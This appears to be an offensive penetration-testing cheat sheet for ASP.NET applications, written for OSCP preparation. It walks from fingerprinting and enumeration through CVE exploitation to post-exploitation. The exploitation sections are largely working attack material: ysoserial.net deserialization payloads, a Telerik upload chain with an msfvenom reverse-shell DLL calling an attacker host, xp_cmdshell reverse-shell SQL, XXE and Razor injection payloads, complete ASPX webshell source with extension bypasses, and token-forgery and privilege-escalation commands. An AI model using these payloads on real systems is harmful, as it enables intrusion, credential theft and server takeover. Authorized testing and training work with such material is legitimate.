# ASP.NET (Core / MVC / WebForms)

> Microsoft ASP.NET framework reference for penetration testing. Covers
> detection, enumeration, known CVEs, exploitation patterns, misconfigurations,
> and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers

ASP.NET apps return distinctive headers:

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|x-powered-by|x-aspnet|x-aspnetmvc|x-aspnet-version|set-cookie)'
```

Expected output:

```text
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319
X-AspNetMvc-Version: 5.2
Set-Cookie: ASP.NET_SessionId=abc123...; path=/; HttpOnly
```

Strong fingerprints:
- `X-Powered-By: ASP.NET` (unless `runAllManagedModulesForAllRequests` + custom headers)
- `X-AspNet-Version: x.y.z` (IIS + ASP.NET Framework, not Core)
- `X-AspNetMvc-Version: x.y` (MVC 5 and earlier; removed in ASP.NET Core)
- `ASP.NET_SessionId` cookie (Framework)
- `.AspNetCore.Session` cookie (ASP.NET Core)
- `.AspNetCore.Antiforgery.*` cookie (ASP.NET Core)

### ASP.NET Core specifics

ASP.NET Core (Kestrel):

```bash
curl -sI http://<TARGET>:5000/ | grep -iE '^(server|set-cookie)'
```

Expected output:

```text
Server: Kestrel
Set-Cookie: .AspNetCore.Session=CfDJ8...; path=/; samesite=lax; httponly
Set-Cookie: .AspNetCore.Antiforgery.xyz=...; path=/; samesite=strict; httponly
```

`Server: Kestrel` is a strong ASP.NET Core indicator.

### Default error pages

**ASP.NET Framework (yellow screen of death):**

```text
Server Error in '/' Application.
--------------------------------------------------------------------------------

Runtime Error
Description: An application error occurred on the server. The current custom error
settings for this application prevent the details of the application error from
being viewed remotely (for security reasons). It could, however, be viewed by
browsers running on the local server machine.

Details: To enable the details of this specific error message to be viewable on
remote machines, please create a <customErrors> tag within a "web.config"
configuration file located in the root directory of the current web application.
This <customErrors> tag should then have its "mode" attribute set to "Off".
```

Full stack trace with source code (when `customErrors mode="Off"`).

**ASP.NET Core (developer exception page):**

```text
An unhandled exception occurred while processing the request.
Exception: ...
Stack Query Cookies Headers Routing
...
```

Full stack trace, query params, cookies, headers when `app.UseDeveloperExceptionPage()`.

### Default welcome page

IIS default ASP.NET welcome page is typically a custom landing page, no default
marker. ASP.NET Core default template: "Welcome" with `Hello World!`.

### nmap / whatweb

```bash
nmap -sV -p 80,443,5000,5001,8080 --script http-headers,http-title <TARGET>
whatweb -a 3 http://<TARGET>/
```

Default ASP.NET Core dev ports: `5000` (HTTP), `5001` (HTTPS).

---

## 2. Enumeration

### Standard ASP.NET paths

```bash
for p in / /Account/Login /Account/Register /admin /api /api/v1 \
         /swagger /swagger/index.html /swagger/v1/swagger.json \
         /health /healthz /elmah.axd /trace.axd /web.config \
         /_framework/blazor.server.js /_blazor; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### Swagger / OpenAPI (ASP.NET Core)

Modern ASP.NET Core APIs ship Swagger in dev:

```bash
curl -s http://<TARGET>:5000/swagger/v1/swagger.json | jq .
curl -s http://<TARGET>:5000/swagger/index.html
```

Full API surface with parameters, schemas, auth.

### ELMAH log viewer

ELMAH (Error Logging Modules and Handlers):

```bash
curl -s http://<TARGET>/elmah.axd
curl -s http://<TARGET>/elmah.axd/stylesheet
```

Exposes all application errors with stack traces, request details, sometimes
credentials in error messages.

### Trace.axd

ASP.NET Framework tracing:

```bash
curl -s http://<TARGET>/trace.axd
```

If `trace enabled="true"` and `localOnly="false"`, exposes request details.

### web.config exposure

```bash
for f in web.config web.config.bak web.config.old Web.config Web.Config; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

`web.config` often includes DB connection strings, SMTP creds, API keys.

### Blazor

Blazor Server apps:

```bash
curl -s http://<TARGET>:5000/_blazor/negotiate?negotiateVersion=1
curl -s http://<TARGET>:5000/_framework/blazor.boot.json | jq .
```

`blazor.boot.json` lists all client-side assemblies -> decompile for secrets.

### Static analysis of JS

Angular / React / Blazor bundles may leak API paths:

```bash
curl -s http://<TARGET>:5000/main.js | grep -oE '"/(api|admin)[^"]*"'
```

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x aspx,ashx,asmx,config,json,cs
```

Extensions:

- `.aspx` -> ASP.NET WebForms page
- `.ashx` -> generic handler
- `.asmx` -> web service
- `.svc` -> WCF service
- `.cshtml` / `.razor` -> MVC / Razor page (server-side, not directly fetched)

### Source file exposure

```bash
for f in Default.aspx.cs Web.config Global.asax.cs Startup.cs Program.cs appsettings.json appsettings.Development.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

If `.cs` or `appsettings.json` served -> full source + config leak.

### appsettings.json (ASP.NET Core)

```bash
curl -s http://<TARGET>:5000/appsettings.json | jq .
curl -s http://<TARGET>:5000/appsettings.Development.json | jq .
```

Expected output:

```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=.;Database=app;User Id=sa;Password=..."
  },
  "Jwt": {
    "Key": "supersecretkey123",
    "Issuer": "myapp"
  },
  "Smtp": {
    "Username": "noreply@example.com",
    "Password": "..."
  }
}
```

### ViewState fingerprint (WebForms)

Legacy ASP.NET WebForms pages include `__VIEWSTATE`:

```bash
curl -s http://<TARGET>/login.aspx | grep -oE '__VIEWSTATE[^"]*value="[^"]*"' | head -3
```

Large `__VIEWSTATE` -> serialized .NET object graph. See section 4.

---

## 3. Known CVEs

### CVE-2021-44228 - Log4Shell (transitive, ASP.NET via Java bridge rare)

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
Not applicable to pure ASP.NET; relevant when Java interop exists.

### CVE-2021-3129 - Not applicable (Laravel)

Not applicable.

### CVE-2020-0688 - ASP.NET ViewState deserialization (Exchange)

`__VIEWSTATE` cryptographic key is static (same on all Exchange servers).
Attacker with any valid OWA login can craft a ViewState payload -> RCE as
`NT AUTHORITY\SYSTEM`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-0688
Affected: Microsoft Exchange Server 2010, 2013, 2016, 2019 (unpatched).

PoC:

```bash
git clone https://github.com/Ridter/cve-2020-0688.git
cd cve-2020-0688
python cve-2020-0688.py -s https://<TARGET>/owa/ -u user@domain -p password
```

### CVE-2020-1147 - .NET deserialization (SharePoint / .NET)

`System.Data.DataSet` / `System.Data.DataTable` deserialization without
validation -> RCE. Affects any ASP.NET app that deserializes untrusted XML.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-1147
Affected: .NET Framework 4.8 and earlier (with specific deserialization paths).

### CVE-2019-18935 - Telerik UI for ASP.NET AJAX deserialization (RCE)

Telerik `RadAsyncUpload` allows uploading a crafted file that deserializes to
RCE. Pre-auth in many configs.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-18935
Affected: Telerik UI for ASP.NET AJAX <= 2019.3.1023 (specific handlers).

PoC:

```bash
git clone https://github.com/noperator/CVE-2019-18935.git
cd CVE-2019-18935
python CVE-2019-18935.py -u http://<TARGET>/Telerik.Web.UI.WebResource.axd -f payload.dll
```

### CVE-2017-9248 - Telerik UI for ASP.NET AJAX crypto flaw

`Telerik.Web.UI.DialogHandler` leaks `machineKey` via crypto oracle -> RCE
via ViewState / custom payload.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-9248
Affected: Telerik UI for ASP.NET AJAX 2007 - 2017.

### CVE-2023-36899 / CVE-2023-36560 - ASP.NET auth bypass

- CVE-2023-36899: ASP.NET Core authorization bypass
- CVE-2023-36560: .NET and Visual Studio elevation of privilege

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-36899
NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-36560

### CVE-2024-21319 - .NET Denial of Service

DoS in .NET 6 / 7 / 8 via crafted request.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-21319
Affected: .NET 6 < 6.0.27, .NET 7 < 7.0.16, .NET 8 < 8.0.1.

### Version -> CVE quick table

| Framework | Type | CVE |
|-----------|------|-----|
| Exchange (any unpatched) | ViewState RCE | CVE-2020-0688 |
| .NET Framework 4.8 and earlier | XML deser | CVE-2020-1147 |
| Telerik UI for ASP.NET AJAX 2007-2017 | Crypto oracle | CVE-2017-9248 |
| Telerik UI for ASP.NET AJAX <= 2019.3.1023 | Upload RCE | CVE-2019-18935 |
| ASP.NET Core (patched) | Auth bypass | CVE-2023-36899 |

ASP.NET itself is well-maintained; most real-world vulnerabilities are:
- Specific libraries (Telerik, DevExpress, Syncfusion, .NET Framework)
- Application-level (SQLi, IDOR, deserialization, SSTI in Razor)
- Configuration (customErrors=Off, machineKey leaks, debugging enabled)

---

## 4. Exploitation Patterns

### ViewState deserialization (CVE-2020-0688 / machineKey leak)

Requirements:
- ASP.NET WebForms page with `__VIEWSTATE`
- Known `machineKey` (from web.config leak, CVE-2017-9248, or Exchange default)
- `enableViewStateMac="false"` OR leaked key

```bash
# Get __VIEWSTATE + __VIEWSTATEGENERATOR from page
curl -s http://<TARGET>/login.aspx | grep -oE '__(VIEWSTATE|VIEWSTATEGENERATOR|EVENTVALIDATION)' | head -3

# Use ysoserial.net to generate payload
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -e <base64-encoded-command>" \
  --path="/login.aspx" --apppath="/" \
  --decryptionalg="AES" --decryptionkey="<decryptionkey>" \
  --validationalg="SHA1" --validationkey="<validationkey>" \
  -o base64

# Send as __VIEWSTATE in POST
curl -X POST http://<TARGET>/login.aspx \
  --data-urlencode "__VIEWSTATE=<payload>" \
  --data-urlencode "__VIEWSTATEGENERATOR=<generator>"
```

Tools: `ysoserial.net` (windows), `ViewStateDecoder`, `Badsecrets`.

Badsecrets (no key needed if default machine key):

```bash
pip install badsecrets
badsecrets --url http://<TARGET>/login.aspx
```

### Telerik RadAsyncUpload RCE (CVE-2019-18935)

```bash
# 1. Detect Telerik
curl -s http://<TARGET>/Telerik.Web.UI.WebResource.axd?type=rau | head -c 200

# 2. Extract keys via CVE-2017-9248
git clone https://github.com/bao7uo/dp_crypto.git
python dp_crypto/dp_crypto.py -u http://<TARGET>/Telerik.Web.UI.DialogHandler.aspx

# 3. Craft a payload DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f dll -o exploit.dll

# 4. Upload via RadAsyncUpload
git clone https://github.com/noperator/CVE-2019-18935.git
python CVE-2019-18935/CVE-2019-18935.py \
  -u http://<TARGET>/Telerik.Web.UI.WebResource.axd?type=rau \
  -f exploit.dll
```

### SQL injection in ASP.NET (ADO.NET / EF)

```bash
curl "http://<TARGET>/search?q=test' UNION SELECT 1,2,3--"
curl "http://<TARGET>/product?id=1; WAITFOR DELAY '0:0:5'--"
```

`sqlmap` with `--dbms=mssql`:

```bash
sqlmap -u "http://<TARGET>/product?id=1" --dbms=mssql --level=5 --risk=3
```

MSSQL-specific escalation:

```sql
-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Reverse shell via PowerShell
EXEC xp_cmdshell 'powershell -e <base64>';
```

### machineKey leak via ViewState

If `__VIEWSTATE` is signed but not encrypted, `ViewStateDecoder` can decode
it and reveal the `validationKey` in some configs (rare).

Tools:

```bash
# blacklist3r
pip install blacklist3r
blacklist3r -viewstate "<__VIEWSTATE>" -generator "<__VIEWSTATEGENERATOR>" -apppath "/" -path "/"

# If default machine key
python -m blacklist3r -v <viewstate>
```

### ASP.NET Core JWT attacks

ASP.NET Core Identity + JWT is common. Same attacks as Express JWT:

- Algorithm confusion (RS256 -> HS256)
- Weak HMAC secret (`Jwt:Key`)
- `kid` injection (path traversal)

```bash
# Get signing key from appsettings.json leak
curl -s http://<TARGET>:5000/appsettings.json | jq '.Jwt.Key'
```

Then forge a token with admin role:

```bash
python3 -c "
import jwt
print(jwt.encode({'sub': '1', 'role': 'Admin'}, '<leaked-key>', algorithm='HS256'))
"
```

### IDOR in OData / WebAPI

ASP.NET OData endpoints often have IDOR:

```bash
curl "http://<TARGET>/odata/Users(1)"
curl "http://<TARGET>/odata/Users(2)"
curl "http://<TARGET>/api/users/1"
curl "http://<TARGET>/api/users/2"
```

OData `$filter` can dump entire tables:

```bash
curl "http://<TARGET>/odata/Users?\$filter=1 eq 1"
```

### Razor SSTI

Razor views are compiled, not evaluated at runtime. SSTI in Razor requires
`RazorLight` or explicit `Engine.Razor.RunCompile(user_input)`:

```bash
curl "http://<TARGET>/page?name=@(7*7)"
curl "http://<TARGET>/page?name=@(System.Diagnostics.Process.Start(\"cmd\",\"/c whoami\"))"
```

Rare but catastrophic when present.

### Deserialization via BinaryFormatter / LosFormatter / ObjectStateFormatter

Look for endpoints accepting serialized data:

```bash
# BinaryFormatter:
# POST body containing base64 or binary .NET serialized object

# Use ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64
```

Send in cookie, header, or POST field.

### XXE in .NET (SOAP / XML endpoints)

```bash
curl -X POST http://<TARGET>/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>'
```

.NET Framework < 4.5.2 enables DTD by default. .NET 4.5.2+ requires
`DtdProcessing.Parse`.

### `__VIEWSTATEGENERATOR` bruteforce

If MAC validation disabled, `VIEWSTATEGENERATOR` can be reused across pages:

```bash
# Reuse the generator from another ASP.NET app on the same server
curl -X POST http://<TARGET>/page.aspx \
  --data-urlencode "__VIEWSTATE=<payload>" \
  --data-urlencode "__VIEWSTATEGENERATOR=<reused>"
```

### File upload -> ASPX webshell

If file upload accepts `.aspx` / `.ashx`:

```bash
curl -F "file=@shell.aspx" http://<TARGET>/upload
curl http://<TARGET>/uploads/shell.aspx?cmd=whoami
```

Webshell payload:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
</script>
```

Bypass extensions: `.aspx;.jpg`, `.asp%00.aspx`, `.aspx/`, `.config` (IIS config
RCE).

---

## 5. Misconfigurations

### `customErrors mode="Off"` in production

```bash
curl "http://<TARGET>/nonexistent" | grep -iE 'Server Error|stack trace|\.cs:'
```

Full stack trace with source file paths and line numbers.

### `debug="true"` in web.config

```bash
curl -s http://<TARGET>/web.config | grep -i 'debug='
```

### ELMAH / trace.axd exposed

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/elmah.axd
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/trace.axd
```

### Directory listing

```bash
curl -s http://<TARGET>/uploads/ | grep -i 'directory of'
```

### web.config exposed

```bash
curl -s http://<TARGET>/web.config
```

Contains: `connectionStrings`, `machineKey`, `appSettings`, auth config.

### Default machineKey in web.config

```xml
<machineKey validationKey="AutoGenerate,IsolateApps" ... />
```

`IsolateApps` derives a per-app key, but apps migrated from old IIS may have
hardcoded keys.

### No HTTPOnly on auth cookies

```bash
curl -sI http://<TARGET>/Account/Login | grep -i 'set-cookie'
```

Missing `HttpOnly` on `.ASPXAUTH` -> XSS session theft.

### ASP.NET Core without HTTPS redirection

```bash
curl -sI http://<TARGET>:5000/ | grep -i 'strict-transport'
```

Missing HSTS -> MITM downgrade.

### Swagger in production

```bash
curl -s http://<TARGET>:5000/swagger/v1/swagger.json | head -c 200
```

Reveals full API surface.

### appsettings.json exposed

```bash
curl -s http://<TARGET>:5000/appsettings.json | jq .
curl -s http://<TARGET>:5000/appsettings.Development.json | jq .
```

Contains DB conn strings, JWT keys, SMTP creds, third-party API keys.

### CORS misconfig

```bash
curl -sI -H "Origin: https://evil.com" http://<TARGET>/api/ | grep -i 'access-control'
```

`AllowAnyOrigin()` + `AllowCredentials()` -> session theft.

### Anonymous access to admin areas

```bash
for p in /admin /Admin/Default.aspx /api/admin/users /elmah.axd; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### ASP.NET Core developer exception page in prod

```bash
curl -s "http://<TARGET>:5000/api/error-trigger" | grep -i 'developer exception'
```

If `app.UseDeveloperExceptionPage()` is enabled in production -> full stack
traces + cookies + headers leak.

### Weak `machineKey` (default from migration)

```xml
<machineKey validationKey="AutoGenerate" decryptionKey="AutoGenerate" ... />
```

`AutoGenerate` is fine for a single app, but common in migrated apps to have
hardcoded keys copied from old servers -> cross-app attack.

---

## 6. Post-Exploitation

### Config file locations

| Framework | Path |
|-----------|------|
| ASP.NET Framework | `<app>/web.config` |
| IIS global | `%SystemRoot%\System32\inetsrv\config\applicationHost.config` |
| .NET machine config | `%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config` |
| ASP.NET Core | `<app>/appsettings.json`, `appsettings.<env>.json` |
| ASP.NET Core (user secrets) | `%APPDATA%\Microsoft\UserSecrets\<id>\secrets.json` |
| Blazor client | `<app>/wwwroot/_framework/` |

### What to look for

```powershell
Get-Content C:\inetpub\wwwroot\web.config
Get-Content C:\inetpub\wwwroot\appsettings.json | ConvertFrom-Json
Select-String -Path C:\inetpub\wwwroot\*.config -Pattern 'connectionString|machineKey|password|secret'
```

Key items:

- `<connectionStrings>` -> DB creds
- `<machineKey>` -> ViewState forgery / deserialization
- `<appSettings>` -> third-party API keys, feature flags
- `<authentication mode="Forms">` -> forms auth cookie config
- `Jwt:Key` -> JWT forgery
- `Smtp:Password` -> email creds
- `Aws` / `Azure` / `S3` -> cloud creds
- `Redis:ConnectionString` -> Redis (often no auth)

### DB connection chain

MSSQL from `connectionString`:

```bash
sqlcmd -S <host> -U <user> -P <password> -d <db>
# Or Windows auth (if running on the host as a user with permissions):
sqlcmd -S <host> -E -d <db>
```

Query for hashes:

```sql
SELECT name, password_hash FROM sys.sql_logins;
SELECT username, password FROM aspnet_Users;  -- legacy
SELECT Email, PasswordHash FROM AspNetUsers; -- Identity
```

ASP.NET Identity password hash format: `AQAAAAEAACcQAAAAE...` (base64 of
PBKDF2 with 1000 iterations by default). Hard to crack; look for weaker
legacy tables.

### Forms auth cookie decryption

If `<machineKey>` is leaked, decrypt/re-encrypt forms auth cookies:

```bash
# Use ASP.NET forms auth cookie tools
# Common: AspNetTicketDecoder / FormsAuthDecoder

# Or use ysoserial.net's machineKey module
ysoserial.exe -p ViewState ... # also supports FormsAuthentication
```

### Session hijacking

`.ASPXAUTH` cookie holds encrypted + MAC'd forms auth ticket. Without key, no
forgery. With leaked key, forge any user:

```bash
# Use machineKey to encrypt a new FormsAuthenticationTicket for "admin"
ysoserial.exe -p MachineKey \
  --validationkey="<key>" --decryptionalg="AES" --decryptionkey="<key>" \
  -c "notepad.exe"  # or handle ticket creation manually
```

### Logs

```powershell
Get-ChildItem C:\inetpub\logs\LogFiles\ -Recurse
Get-Content C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log -Tail 200
Get-ChildItem C:\inetpub\wwwroot\App_Data\Logs\ -Recurse -ErrorAction SilentlyContinue
```

### Event log (Windows)

```powershell
Get-WinEvent -LogName Application -MaxEvents 100 | Where-Object { $_.ProviderName -match 'ASP.NET' }
```

### IIS application pool identity

```powershell
Get-ChildItem IIS:\AppPools | Select-Object Name, processModel
Get-Process -IncludeUserName | Where-Object { $_.ProcessName -match 'w3wp' }
```

If the app pool runs as a domain user, escalate to domain compromise.

### Web shell hunting

```powershell
Get-ChildItem -Recurse -Include *.aspx,*.ashx,*.asmx,*.config,*.svc C:\inetpub\wwwroot\ -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5000 -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) }
```

Look for freshly created files (attacker persistence) - timestamps near
compromise time.

### `RazorLight` compiled templates

If app uses `RazorLight` to compile user input:

```bash
curl "http://<TARGET>/render?name=@(System.Diagnostics.Process.Start(\"cmd\",\"/c whoami\"))"
```

### Windows privesc from `w3wp` (IIS worker)

Check SeImpersonatePrivilege:

```powershell
whoami /priv
# If SeImpersonatePrivilege is enabled -> PrintSpoofer / JuicyPotato / RoguePotato
```

```powershell
# PrintSpoofer
PrintSpoofer.exe -i -c cmd
# JuicyPotato
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

### Impersonation (tokens)

The `w3wp.exe` process often runs as `ApplicationPoolIdentity` or `NETWORK
SERVICE`. Token impersonation via `meterpreter`:

```text
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `X-Powered-By: ASP.NET` AND `X-AspNet-Version` headers (or `Server: Kestrel` for Core) - they identify the framework.

> [!IMPORTANT]
> OSCP report: for ViewState deserialization, screenshot the leaked `machineKey` (from web.config or Badsecrets) AND the working payload execution.

> [!IMPORTANT]
> OSCP report: for `web.config` / `appsettings.json` exposure, screenshot the file content AND at least one successful use of an extracted credential.

---

## 8. References

- ASP.NET official docs: https://learn.microsoft.com/en-us/aspnet/
- ASP.NET Core docs: https://learn.microsoft.com/en-us/aspnet/core/
- NVD search: https://nvd.nist.gov/vuln/search/results?query=asp.net
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- Badsecrets: https://github.com/blacklanternsecurity/badsecrets
- CVE-2020-0688 writeup: https://github.com/Ridter/cve-2020-0688
- CVE-2019-18935 writeup: https://github.com/noperator/CVE-2019-18935
- HackTricks - ASP.NET: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
- PayloadsAllTheThings - .NET: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/.NET%20Deserialization

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*